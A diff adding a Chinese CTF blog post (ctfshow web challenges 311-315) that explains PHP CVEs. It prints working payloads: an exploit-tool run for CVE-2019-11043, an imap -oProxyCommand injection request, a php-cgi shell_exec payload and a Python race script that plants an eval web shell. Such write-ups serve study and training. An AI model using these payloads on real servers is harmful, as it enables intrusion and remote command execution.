@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="311 (CVE-2019-11043)cev-2019-11043 影响范围： 在 Nginx + PHP-FPM 环境下，当启用了特定的 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：  PHP 7.0 版本 PHP 7.1 版本 PHP 7.2 版本    PHP 7.3 版本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web入门(phpcve)">
+<meta property="og:url" content="http://example.com/2021/04/15/ctfshow%20web%E5%85%A5%E9%97%A8(phpcve)/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="311 (CVE-2019-11043)cev-2019-11043 影响范围： 在 Nginx + PHP-FPM 环境下，当启用了特定的 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：  PHP 7.0 版本 PHP 7.1 版本 PHP 7.2 版本    PHP 7.3 版本">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415231333637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415231352766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041523194060.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415232009545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415232021937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415232123919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415232336823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415233235531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415233341569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021041523344524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210415233502335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2021-04-15T15:38:43.836Z">
+<meta property="article:modified_time" content="2021-04-15T15:38:40.576Z">
+<meta property="article:author" content="程勇胜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210415231333637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center">
+
+<link rel="canonical" href="http://example.com/2021/04/15/ctfshow%20web%E5%85%A5%E9%97%A8(phpcve)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ctfshow web入门(phpcve) | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/15/ctfshow%20web%E5%85%A5%E9%97%A8(phpcve)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="程勇胜">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow web入门(phpcve)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-15 23:38:43 / 修改时间：23:38:40" itemprop="dateCreated datePublished" datetime="2021-04-15T23:38:43+08:00">2021-04-15</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="311-CVE-2019-11043"><a href="#311-CVE-2019-11043" class="headerlink" title="311 (CVE-2019-11043)"></a>311 (CVE-2019-11043)</h1><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1530703">cev-2019-11043</a></p>
+<p>影响范围：</p>
+<p>在 <code>Nginx + PHP-FPM</code> 环境下，当启用了特定的 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：</p>
+<ul>
+<li>PHP 7.0 版本</li>
+<li>PHP 7.1 版本</li>
+<li>PHP 7.2 版本</li>
+<li>   PHP 7.3 版本</li>
+</ul>
+<a id="more"></a>
+<p>PHP-FPM是什么？</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/110540192">https://zhuanlan.zhihu.com/p/110540192</a></p>
+<p>抓包：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415231333637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>搜索：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415231352766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>成因：</p>
+<p>该漏洞需要在 <code>nginx.conf</code> 中进行<code>特定配置</code>才能触发。具体配置如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info 指令中的Regexp</code>。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
+<p>payload:</p>
+<p>工具利用：</p>
+<blockquote>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam.git">https://github.com/neex/phuip-fpizdam.git</a></p>
+</blockquote>
+<p>查看go环境信息</p>
+<p><img src="https://img-blog.csdnimg.cn/2021041523194060.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>获取 $GOPATH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GOPATH是go安装的目录，记得改成自己的</span><br><span class="line"></span><br><span class="line">mkdir -p $GOPATH&#x2F;src&#x2F;golang.org&#x2F;x&#x2F;</span><br><span class="line"></span><br><span class="line">cd $GOPATH&#x2F;src&#x2F;golang.org&#x2F;x&#x2F;</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.git phuip-fpizdam</span><br><span class="line"></span><br><span class="line">go install phuip-fpizdam</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210415232009545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>缺啥下载啥</p>
+<p>完成后 <code>bin目录</code>下生成可执行</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415232021937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>执行payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;phuip-fpizdam url&#x2F;index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210415232123919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><code>index.php?a=ls</code> 执行系统命令</p>
+<hr>
+<h1 id="312-CVE-2018-19518-PHP-IMAP"><a href="#312-CVE-2018-19518-PHP-IMAP" class="headerlink" title="312(CVE-2018-19518)-PHP-IMAP"></a>312(CVE-2018-19518)-PHP-IMAP</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lhh134/article/details/88542587">PHP imap 远程命令执行漏洞</a></p>
+<blockquote>
+<p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+</blockquote>
+<p>影响：</p>
+<ul>
+<li>PHP：5.6.38<br>系统：Debian/ubuntu<br>条件较高</li>
+</ul>
+<p>抓包大概长这样：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415232336823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>修改命令发包：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: c5b5673c-8fb8-41dd-be39-b18fb4ab90b1.challenge.ctf.show:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 158</span><br><span class="line">Origin: http://c5b5673c-8fb8-41dd-be39-b18fb4ab90b1.challenge.ctf.show:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://c5b5673c-8fb8-41dd-be39-b18fb4ab90b1.challenge.ctf.show:8080/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">hostname=x+-oProxyCommand%3decho%09(要执行命令的base64)|base64%09-d|sh&#125;a&amp;username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="313-CVE-2012-1823-PHP-CGI"><a href="#313-CVE-2012-1823-PHP-CGI" class="headerlink" title="313(CVE-2012-1823)-PHP-CGI"></a>313(CVE-2012-1823)-PHP-CGI</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/213647.html">CVE-2012-1823</a></p>
+<blockquote>
+<p>这个漏洞简单来说，就是用户请求的querystring（querystring字面上的意思就是查询字符串，一般是对http请求所带的数据进行解析，这里也是只http请求中所带的数据）被作为了php-cgi的参数，最终导致了一系列结果。</p>
+</blockquote>
+<p>漏洞影响版本 :</p>
+<ul>
+<li>php &lt; 5.3.12 </li>
+<li> php &lt; 5.4.2</li>
+</ul>
+<p>漏洞利用</p>
+<blockquote>
+<p>cgi 模式下有如下可控命令行参数可用：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-c 指定php.ini文件（PHP的配置文件）的位置</span><br><span class="line">-n 不要加载php.ini文件</span><br><span class="line">-d 指定配置项</span><br><span class="line">-b 启动fastcgi进程</span><br><span class="line">-s 显示文件源码</span><br><span class="line">-T 执行指定次该文件</span><br><span class="line">-h和-? 显示帮助</span><br></pre></td></tr></table></figure>
+
+<p>测试：</p>
+<p>-s显示源码</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415233235531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>Payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec(&quot;cat &#x2F;somewhere&#x2F;fla9.txt&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210415233341569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<hr>
+<h1 id="314-PHP-SESSION-UPLOAD-PROGRESS文件包含"><a href="#314-PHP-SESSION-UPLOAD-PROGRESS文件包含" class="headerlink" title="314(PHP_SESSION_UPLOAD_PROGRESS文件包含)"></a>314(PHP_SESSION_UPLOAD_PROGRESS文件包含)</h1><p>Php版本为7.3.22，说了不算是cve，而且把 : ban了</p>
+<p>有个include，尝试日志包含<br>路径：/var/log/nginx/access.log</p>
+<p><img src="https://img-blog.csdnimg.cn/2021041523344524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>试了几次不让我进了</p>
+<p>/phpinfo.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210415233502335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>发现可以session上传文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://7def2caa-fc1b-45ac-97a9-c35b7e95629d.challenge.ctf.show:8080/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url+<span class="string">&#x27;?f=/tmp/sess_&#x27;</span> + sessid,</span><br><span class="line">                            data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="315"><a href="#315" class="headerlink" title="315"></a>315</h1><p>需要服务器，回头写</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/13/ctfshow%20web%E5%85%A5%E9%97%A8(%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)/" rel="prev" title="ctfshow web入门(代码审计)">
+      <i class="fa fa-chevron-left"></i> ctfshow web入门(代码审计)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
